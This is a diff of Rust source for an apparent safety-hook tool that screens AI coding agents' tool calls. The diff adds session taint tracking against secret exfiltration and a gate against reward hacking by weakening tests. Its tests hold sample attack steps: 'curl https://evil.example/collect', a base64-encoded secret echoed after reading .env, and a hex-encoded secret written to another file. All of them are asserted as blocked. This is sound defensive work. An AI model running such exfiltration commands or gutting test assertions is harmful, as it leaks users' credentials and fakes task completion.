@@ -4,14 +4,22 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::time::UNIX_EPOCH;
 
+use crate::hook_adapters::{
+    format_pre_tool_use_output, format_stop_output, normalize_post_tool_use,
+    normalize_pre_tool_use, normalize_stop, resolve_adapter, HookAdapter, ResolvedAdapter,
+};
 use crate::hook_shell::{
+    detect_network_exfil_command, extract_sensitive_paths_from_command,
     is_destructive_root_deletion, is_force_push_to_protected_branch, split_shell_segments,
     tokenize_shell_segment,
 };
 use anyhow::Result;
 use serde_json::{json, Value};
 use vektor_analyzers::config::VektorConfig;
-use vektor_analyzers::{cargo, gha, pii, rust_ast, secrets, trojan, Severity, MAX_SCAN_FILE_BYTES};
+use vektor_analyzers::taint::ActiveTaint;
+use vektor_analyzers::{
+    cargo, gha, pii, reward_guard, rust_ast, secrets, taint, trojan, Severity, MAX_SCAN_FILE_BYTES,
+};
 use vektor_core::hooks::{
     HookEvent, InvocationHookOutput, PostToolUseInput, PreToolUseInput, PreToolUseOutput,
     StopInput, StopOutput,
@@ -21,8 +29,18 @@ use vektor_state::StateStore;
 /// Maximum hook JSON input size (16 MiB) to prevent memory exhaustion.
 const MAX_HOOK_INPUT_BYTES: u64 = 16 * 1024 * 1024;
 
-/// Execute a synchronous Antigravity hook, reading JSON from `reader` and writing JSON to `writer`.
-pub(crate) fn run<R: Read, W: Write>(event: HookEvent, reader: R, mut writer: W) -> Result<()> {
+/// Execute a synchronous hook with auto-detected protocol adapter.
+pub(crate) fn run<R: Read, W: Write>(event: HookEvent, reader: R, writer: W) -> Result<()> {
+    run_with_adapter(event, HookAdapter::Auto, reader, writer)
+}
+
+/// Execute a synchronous lifecycle hook using the requested or auto-detected agent adapter.
+pub(crate) fn run_with_adapter<R: Read, W: Write>(
+    event: HookEvent,
+    adapter: HookAdapter,
+    reader: R,
+    mut writer: W,
+) -> Result<()> {
     let mut raw_bytes = Vec::new();
     reader
         .take(MAX_HOOK_INPUT_BYTES.saturating_add(1))
@@ -33,16 +51,26 @@ pub(crate) fn run<R: Read, W: Write>(event: HookEvent, reader: R, mut writer: W)
 
     let output: Value = if oversized {
         eprintln!("vektor hook input exceeded maximum allowed size ({MAX_HOOK_INPUT_BYTES} bytes)");
+        let fallback_adapter = match adapter {
+            HookAdapter::ClaudeCode => ResolvedAdapter::ClaudeCode,
+            HookAdapter::Cursor => ResolvedAdapter::Cursor,
+            HookAdapter::Auto | HookAdapter::Antigravity | HookAdapter::Codex => {
+                ResolvedAdapter::Antigravity
+            }
+        };
         match event {
-            HookEvent::PreToolUse => serde_json::to_value(PreToolUseOutput::deny(
-                "Vektor safety gate: PreToolUse hook payload exceeded size limit (fail-closed).",
-            ))?,
-            HookEvent::Stop => serde_json::to_value(StopOutput::allow_stop())?,
+            HookEvent::PreToolUse => format_pre_tool_use_output(
+                fallback_adapter,
+                &PreToolUseOutput::deny(
+                    "Vektor safety gate: PreToolUse hook payload exceeded size limit (fail-closed).",
+                ),
+            )?,
+            HookEvent::Stop => format_stop_output(fallback_adapter, &StopOutput::allow_stop())?,
             _ => json!({}),
         }
     } else {
         let raw = String::from_utf8_lossy(&raw_bytes);
-        dispatch_event(event, &raw)?
+        dispatch_event(event, adapter, &raw)?
     };
 
     serde_json::to_writer(&mut writer, &output)?;
@@ -51,32 +79,61 @@ pub(crate) fn run<R: Read, W: Write>(event: HookEvent, reader: R, mut writer: W)
     Ok(())
 }
 
-fn dispatch_event(event: HookEvent, raw: &str) -> Result<Value> {
+fn dispatch_event(event: HookEvent, requested_adapter: HookAdapter, raw: &str) -> Result<Value> {
+    let parsed_json = match serde_json::from_str::<Value>(raw) {
+        Ok(val) => val,
+        Err(err) => {
+            eprintln!("vektor {event:?} JSON parse error: {err}");
+            let fallback_adapter = match requested_adapter {
+                HookAdapter::ClaudeCode => ResolvedAdapter::ClaudeCode,
+                HookAdapter::Cursor => ResolvedAdapter::Cursor,
+                HookAdapter::Auto | HookAdapter::Antigravity | HookAdapter::Codex => {
+                    ResolvedAdapter::Antigravity
+                }
+            };
+            return match event {
+                HookEvent::PreToolUse => format_pre_tool_use_output(
+                    fallback_adapter,
+                    &PreToolUseOutput::deny(
+                        "Vektor safety gate: malformed PreToolUse hook payload (fail-closed).",
+                    ),
+                ),
+                HookEvent::Stop => format_stop_output(fallback_adapter, &StopOutput::allow_stop()),
+                _ => Ok(json!({})),
+            };
+        }
+    };
+
+    let adapter = resolve_adapter(requested_adapter, &parsed_json);
+
     match event {
-        HookEvent::PreToolUse => match serde_json::from_str::<PreToolUseInput>(raw) {
-            Ok(input) => Ok(serde_json::to_value(evaluate_pre_tool_use(&input))?),
+        HookEvent::PreToolUse => match normalize_pre_tool_use(adapter, &parsed_json) {
+            Ok(input) => format_pre_tool_use_output(adapter, &evaluate_pre_tool_use(&input)),
             Err(err) => {
-                eprintln!("vektor PreToolUse JSON parse error: {err}");
-                Ok(serde_json::to_value(PreToolUseOutput::deny(
-                    "Vektor safety gate: malformed PreToolUse hook payload (fail-closed).",
-                ))?)
+                eprintln!("vektor PreToolUse normalization error: {err}");
+                format_pre_tool_use_output(
+                    adapter,
+                    &PreToolUseOutput::deny(
+                        "Vektor safety gate: malformed PreToolUse hook payload (fail-closed).",
+                    ),
+                )
             }
         },
         HookEvent::PostToolUse => {
-            match serde_json::from_str::<PostToolUseInput>(raw) {
+            match normalize_post_tool_use(adapter, &parsed_json) {
                 Ok(input) => handle_post_tool_use(&input),
-                Err(err) => eprintln!("vektor PostToolUse JSON parse error: {err}"),
+                Err(err) => eprintln!("vektor PostToolUse normalization error: {err}"),
             }
             Ok(json!({}))
         }
         HookEvent::SessionStart | HookEvent::PreInvocation | HookEvent::PostInvocation => {
             Ok(serde_json::to_value(InvocationHookOutput::default())?)
         }
-        HookEvent::Stop => match serde_json::from_str::<StopInput>(raw) {
-            Ok(input) => Ok(serde_json::to_value(evaluate_stop(&input))?),
+        HookEvent::Stop => match normalize_stop(adapter, &parsed_json) {
+            Ok(input) => format_stop_output(adapter, &evaluate_stop(&input)),
             Err(err) => {
-                eprintln!("vektor Stop JSON parse error: {err}");
-                Ok(serde_json::to_value(StopOutput::allow_stop())?)
+                eprintln!("vektor Stop normalization error: {err}");
+                format_stop_output(adapter, &StopOutput::allow_stop())
             }
         },
     }
@@ -84,21 +141,46 @@ fn dispatch_event(event: HookEvent, raw: &str) -> Result<Value> {
 
 /// Deterministic `<5ms` safety policy for `PreToolUse` across commands and file writes/edits.
 fn evaluate_pre_tool_use(input: &PreToolUseInput) -> PreToolUseOutput {
+    let root = resolve_workspace_root_explicit(&input.common.workspace_paths, &input.common.cwd);
+    let cfg = root.as_deref().map(VektorConfig::load).unwrap_or_default();
+    let active_taints = if cfg.taint_tracking {
+        root.as_deref()
+            .map(|r| load_active_taints(r, &input.common.conversation_id))
+            .unwrap_or_default()
+    } else {
+        Vec::new()
+    };
+
     match input.tool_call.name.as_str() {
-        "run_command" => evaluate_run_command(&input.tool_call.args),
-        "write_file" => evaluate_file_mutation(
-            input.tool_call.args.get("Path").and_then(Value::as_str),
-            input.tool_call.args.get("Content").and_then(Value::as_str),
-            true,
+        "run_command" => evaluate_run_command(&input.tool_call.args, &active_taints),
+        "write_file" => {
+            let path = input.tool_call.args.get("Path").and_then(Value::as_str);
+            let existing = path.and_then(|p| read_file_bounded_for_hook(Path::new(p)));
+            evaluate_file_mutation(
+                path,
+                existing.as_deref(),
+                input.tool_call.args.get("Content").and_then(Value::as_str),
+                true,
+                cfg.anti_reward_hacking,
+                &active_taints,
+            )
+        }
+        "edit_file" => evaluate_edit_file(
+            &input.tool_call.args,
+            cfg.anti_reward_hacking,
+            &active_taints,
         ),
-        "edit_file" => evaluate_edit_file(&input.tool_call.args),
         _ => PreToolUseOutput::allow(),
     }
 }
 
 /// Simulate applying `Target` -> `Replacement` to the existing file (bounded) so split-secret,
-/// mid-file BOM, and GHA context bypasses cannot evade `PreToolUse` scanning.
-fn evaluate_edit_file(args: &Value) -> PreToolUseOutput {
+/// mid-file BOM, GHA context, and anti-reward-hacking checks cannot be bypassed in `PreToolUse`.
+fn evaluate_edit_file(
+    args: &Value,
+    anti_reward_hacking: bool,
+    active_taints: &[ActiveTaint],
+) -> PreToolUseOutput {
     let path_str = args.get("Path").and_then(Value::as_str);
     let replacement = args.get("Replacement").and_then(Value::as_str);
     let target = args.get("Target").and_then(Value::as_str);
@@ -112,14 +194,28 @@ fn evaluate_edit_file(args: &Value) -> PreToolUseOutput {
             if let Some(existing) = read_file_bounded_for_hook(Path::new(path)) {
                 if existing.contains(tgt) {
                     let simulated = existing.replace(tgt, repl);
-                    return evaluate_file_mutation(Some(path), Some(&simulated), true);
+                    return evaluate_file_mutation(
+                        Some(path),
+                        Some(&existing),
+                        Some(&simulated),
+                        true,
+                        anti_reward_hacking,
+                        active_taints,
+                    );
                 }
             }
         }
     }
 
     // Fallback: scan replacement fragment with leading BOM disallowed.
-    evaluate_file_mutation(path_str, Some(repl), false)
+    evaluate_file_mutation(
+        path_str,
+        None,
+        Some(repl),
+        false,
+        anti_reward_hacking,
+        active_taints,
+    )
 }
 
 fn read_file_bounded_for_hook(path: &Path) -> Option<String> {
@@ -139,11 +235,22 @@ fn read_file_bounded_for_hook(path: &Path) -> Option<String> {
     String::from_utf8(bytes).ok()
 }
 
-/// Incrementally re-index edited `.rs` files into `SQLite` WAL and mark them dirty for `Stop`.
+/// Record cross-tool session taints and incrementally re-index edited `.rs` files into `SQLite` WAL.
 fn handle_post_tool_use(input: &PostToolUseInput) {
     if input.error.is_some() {
         return;
     }
+
+    let Some(root) = resolve_workspace_root(&input.common.workspace_paths, &input.common.cwd)
+    else {
+        return;
+    };
+
+    let cfg = VektorConfig::load(&root);
+    if cfg.taint_tracking {
+        record_post_tool_taint(input, &root, cfg.taint_ttl_secs);
+    }
+
     if input.tool_call.name != "write_file" && input.tool_call.name != "edit_file" {
         return;
     }
@@ -159,10 +266,6 @@ fn handle_post_tool_use(input: &PostToolUseInput) {
         return;
     }
 
-    let Some(root) = resolve_workspace_root(&input.common.workspace_paths, &input.common.cwd)
-    else {
-        return;
-    };
     if !root.join("Cargo.toml").is_file() {
         return;
     }
@@ -203,6 +306,88 @@ fn handle_post_tool_use(input: &PostToolUseInput) {
     }
 }
 
+fn record_post_tool_taint(input: &PostToolUseInput, root: &Path, ttl_secs: i64) {
+    let mut candidate_paths: Vec<PathBuf> = Vec::new();
+    match input.tool_call.name.as_str() {
+        "read_file" | "view_file" | "write_file" | "edit_file" => {
+            let path_opt = input
+                .tool_call
+                .args
+                .get("Path")
+                .or_else(|| input.tool_call.args.get("AbsolutePath"))
+                .or_else(|| input.tool_call.args.get("file_path"))
+                .and_then(Value::as_str);
+            if let Some(p) = path_opt {
+                let pb = PathBuf::from(p);
+                candidate_paths.push(if pb.is_absolute() { pb } else { root.join(pb) });
+            }
+        }
+        "run_command" => {
+            let cmd = input
+                .tool_call
+                .args
+                .get("CommandLine")
+                .or_else(|| input.tool_call.args.get("command"))
+                .and_then(Value::as_str)
+                .unwrap_or_default();
+            for rel_or_abs in extract_sensitive_paths_from_command(cmd) {
+                let pb = PathBuf::from(&rel_or_abs);
+                candidate_paths.push(if pb.is_absolute() { pb } else { root.join(pb) });
+            }
+        }
+        _ => return,
+    }
+
+    if candidate_paths.is_empty() {
+        return;
+    }
+
+    for path in candidate_paths {
+        let rel = path
+            .strip_prefix(root)
+            .unwrap_or(&path)
+            .display()
+            .to_string()
+            .replace('\\', "/");
+
+        let fps = if let Some(content) = read_file_bounded_for_hook(&path) {
+            taint::extract_taint_fingerprints(&rel, &content)
+        } else if taint::is_sensitive_path(&rel) {
+            taint::extract_taint_fingerprints(&rel, "")
+        } else {
+            Vec::new()
+        };
+
+        if fps.is_empty() {
+            continue;
+        }
+
+        match StateStore::open_workspace(root) {
+            Ok(mut store) => {
+                if let Err(err) = store.record_session_taints(
+                    &input.common.conversation_id,
+                    &rel,
+                    &fps,
+                    Some(ttl_secs),
+                ) {
+                    eprintln!("vektor PostToolUse taint write failed for {rel}: {err}");
+                }
+            }
+            Err(err) => eprintln!("vektor PostToolUse failed to open state DB for taint: {err}"),
+        }
+    }
+}
+
+fn load_active_taints(root: &Path, session_id: &str) -> Vec<ActiveTaint> {
+    if !root.join(".vektor").join("state.db").is_file() {
+        return Vec::new();
+    }
+    StateStore::open_workspace(root)
+        .ok()
+        .and_then(|store| store.active_session_taints(session_id).ok())
+        .unwrap_or_default()
+}
+
 /// Configurable `Stop` quality gate: verifies `cargo check --offline` when `.rs` files changed.
 fn evaluate_stop(input: &StopInput) -> StopOutput {
     if input.continuation_active || input.termination_reason != "NO_TOOL_CALL" {
@@ -222,14 +407,6 @@ fn evaluate_stop(input: &StopInput) -> StopOutput {
         return StopOutput::allow_stop();
     };
     if !root.join("Cargo.toml").is_file() {
-        return StopOutput::allow_stop();
-    }
-
-    let gate_mode = env_gate.as_deref().map_or_else(
-        || VektorConfig::load(&root).stop_gate,
-        str::to_ascii_lowercase,
-    );
-    if gate_mode == "off" || gate_mode == "0" {
         return StopOutput::allow_stop();
     }
 
@@ -309,15 +486,18 @@ fn evaluate_stop(input: &StopInput) -> StopOutput {
 }
 
 fn resolve_workspace_root(workspace_paths: &[String], cwd: &str) -> Option<PathBuf> {
+    resolve_workspace_root_explicit(workspace_paths, cwd).or_else(|| std::env::current_dir().ok())
+}
+
+fn resolve_workspace_root_explicit(workspace_paths: &[String], cwd: &str) -> Option<PathBuf> {
     workspace_paths
         .first()
         .filter(|p| !p.is_empty())
         .map(PathBuf::from)
         .or_else(|| (!cwd.is_empty()).then(|| PathBuf::from(cwd)))
-        .or_else(|| std::env::current_dir().ok())
 }
 
-fn evaluate_run_command(args: &Value) -> PreToolUseOutput {
+fn evaluate_run_command(args: &Value, active_taints: &[ActiveTaint]) -> PreToolUseOutput {
     let cmd = args
         .get("CommandLine")
         .and_then(Value::as_str)
@@ -345,6 +525,16 @@ fn evaluate_run_command(args: &Value) -> PreToolUseOutput {
                 "Vektor safety gate: destructive root deletion blocked.",
             );
         }
+        if !active_taints.is_empty() {
+            if let Some(net_tool) = detect_network_exfil_command(&tokens, segment) {
+                let source = active_taints
+                    .first()
+                    .map_or("<sensitive>", |t| t.source_path.as_str());
+                return PreToolUseOutput::deny(format!(
+                    "Vektor Taint Guard [TAINT-NET-EXFIL]: outbound network command `{net_tool}` blocked while session holds tainted data from `{source}`."
+                ));
+            }
+        }
     }
 
     // 3. Secret scan on command line with inline `vektor:ignore` disabled.
@@ -356,13 +546,26 @@ fn evaluate_run_command(args: &Value) -> PreToolUseOutput {
         ));
     }
 
+    // 4. Cross-tool session taint exfiltration check (raw, base64, hex, url-encoded).
+    if let Some(taint_hit) = taint::detect_exfiltration(cmd, active_taints) {
+        return PreToolUseOutput::deny(format!(
+            "Vektor Taint Guard [TAINT-EXFIL-{}]: blocked exfiltration of tainted {} from `{}` in command line.",
+            taint_hit.encoding.to_ascii_uppercase(),
+            taint_hit.kind,
+            taint_hit.source_path
+        ));
+    }
+
     PreToolUseOutput::allow()
 }
 
 fn evaluate_file_mutation(
     path: Option<&str>,
+    before: Option<&str>,
     content: Option<&str>,
     allow_leading_bom: bool,
+    anti_reward_hacking: bool,
+    active_taints: &[ActiveTaint],
 ) -> PreToolUseOutput {
     let Some(text) = content else {
         return PreToolUseOutput::allow();
@@ -383,6 +586,46 @@ fn evaluate_file_mutation(
             "Vektor secret guard [{}]: {} at line {} ({}). Use environment variables or a secret manager instead.",
             hit.rule_id, hit.message, hit.line, hit.redacted_match
         ));
+    }
+
+    // Cross-tool taint check: block copying or encoding tainted values into a different file.
+    if !active_taints.is_empty() {
+        let norm_label = label.replace('\\', "/").to_ascii_lowercase();
+        let other_taints: Vec<ActiveTaint> = active_taints
+            .iter()
+            .filter(|t| {
+                let src = t.source_path.replace('\\', "/").to_ascii_lowercase();
+                !(norm_label == src || norm_label.ends_with(&format!("/{src}")))
+            })
+            .cloned()
+            .collect();
+        if let Some(taint_hit) = taint::detect_exfiltration(text, &other_taints) {
+            return PreToolUseOutput::deny(format!(
+                "Vektor Taint Guard [TAINT-FILE-{}]: blocked copying tainted {} from `{}` into `{label}`.",
+                taint_hit.encoding.to_ascii_uppercase(),
+                taint_hit.kind,
+                taint_hit.source_path
+            ));
+        }
+    }
+
+    // Anti-Reward-Hacking AST & Policy Integrity Gate.
+    if anti_reward_hacking {
+        if let Some(before_text) = before {
+            let rhg_hits = reward_guard::analyze_diff(label, before_text, text);
+            if let Some(crit) = rhg_hits.iter().find(|f| f.severity == Severity::Critical) {
+                return PreToolUseOutput::deny(format!(
+                    "Vektor Anti-Reward-Hacking Gate [{}]: {}",
+                    crit.rule_id, crit.message
+                ));
+            }
+            if let Some(high) = rhg_hits.iter().find(|f| f.severity == Severity::High) {
+                return PreToolUseOutput::ask(format!(
+                    "Vektor Anti-Reward-Hacking Gate [{}]: {} Confirm intentional test/policy reduction.",
+                    high.rule_id, high.message
+                ));
+            }
+        }
     }
 
     if is_github_workflow_path(label) {
@@ -637,5 +880,164 @@ mod tests {
             ..Default::default()
         };
         assert_eq!(evaluate_pre_tool_use(&input).decision, PreToolDecision::Ask);
+    }
+
+    #[test]
+    fn anti_reward_hacking_gate_blocks_unsafe_allow_and_asks_on_assert_removal() {
+        let dir = std::env::temp_dir().join(format!("vektor-rhg-hook-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("mkdir");
+        let file = dir.join("lib.rs");
+        std::fs::write(
+            &file,
+            "#[cfg(test)]\nmod tests {\n    #[test]\n    fn ok() {\n        assert_eq!(1, 1);\n        assert!(true);\n    }\n}\n",
+        )
+        .expect("write");
+
+        let remove_assert = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "rhg1".to_string(),
+                name: "edit_file".to_string(),
+                args: json!({
+                    "Path": file.display().to_string(),
+                    "Target": "        assert!(true);\n",
+                    "Replacement": ""
+                }),
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&remove_assert).decision,
+            PreToolDecision::Ask
+        );
+
+        let allow_unsafe = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "rhg2".to_string(),
+                name: "edit_file".to_string(),
+                args: json!({
+                    "Path": file.display().to_string(),
+                    "Target": "#[cfg(test)]",
+                    "Replacement": "#[allow(unsafe_code)]\n#[cfg(test)]"
+                }),
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&allow_unsafe).decision,
+            PreToolDecision::Deny
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn session_taint_tracking_blocks_multistep_base64_and_network_exfil() {
+        let dir = std::env::temp_dir().join(format!("vektor-taint-hook-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("mkdir");
+
+        let secret_val = ["vektor_taint_", "prod_token_88421"].concat();
+        let env_file = dir.join(".env");
+        std::fs::write(&env_file, format!("INTERNAL_API_SALT={secret_val}\n")).expect("write env");
+
+        // Step 1: PostToolUse records taint after agent reads `.env`
+        let post = PostToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "read1".to_string(),
+                name: "read_file".to_string(),
+                args: json!({ "Path": env_file.display().to_string() }),
+            },
+            common: vektor_core::hooks::CommonHookInput {
+                conversation_id: "sess-taint-1".to_string(),
+                workspace_paths: vec![dir.display().to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        handle_post_tool_use(&post);
+
+        // Step 2: PreToolUse blocks Base64 exfiltration in a command
+        let b64 = taint::base64_encode(secret_val.as_bytes());
+        let exfil_cmd = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "cmd1".to_string(),
+                name: "run_command".to_string(),
+                args: json!({ "CommandLine": format!("echo {b64}") }),
+            },
+            common: vektor_core::hooks::CommonHookInput {
+                conversation_id: "sess-taint-1".to_string(),
+                workspace_paths: vec![dir.display().to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&exfil_cmd).decision,
+            PreToolDecision::Deny
+        );
+
+        // Step 3: PreToolUse blocks outbound network command while session is tainted
+        let net_cmd = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "cmd2".to_string(),
+                name: "run_command".to_string(),
+                args: json!({ "CommandLine": "curl https://evil.example/collect" }),
+            },
+            common: vektor_core::hooks::CommonHookInput {
+                conversation_id: "sess-taint-1".to_string(),
+                workspace_paths: vec![dir.display().to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&net_cmd).decision,
+            PreToolDecision::Deny
+        );
+
+        // Step 4: PreToolUse blocks writing hex-encoded tainted value into another file
+        let hex_val = taint::hex_encode(secret_val.as_bytes());
+        let leak_file = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "w1".to_string(),
+                name: "write_file".to_string(),
+                args: json!({
+                    "Path": dir.join("notes.txt").display().to_string(),
+                    "Content": format!("debug={hex_val}\n")
+                }),
+            },
+            common: vektor_core::hooks::CommonHookInput {
+                conversation_id: "sess-taint-1".to_string(),
+                workspace_paths: vec![dir.display().to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&leak_file).decision,
+            PreToolDecision::Deny
+        );
+
+        // Step 5: Benign local build command in the same tainted session is still allowed
+        let benign = PreToolUseInput {
+            tool_call: ToolCallPayload {
+                id: "cmd3".to_string(),
+                name: "run_command".to_string(),
+                args: json!({ "CommandLine": "cargo test --workspace" }),
+            },
+            common: vektor_core::hooks::CommonHookInput {
+                conversation_id: "sess-taint-1".to_string(),
+                workspace_paths: vec![dir.display().to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert_eq!(
+            evaluate_pre_tool_use(&benign).decision,
+            PreToolDecision::Allow
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
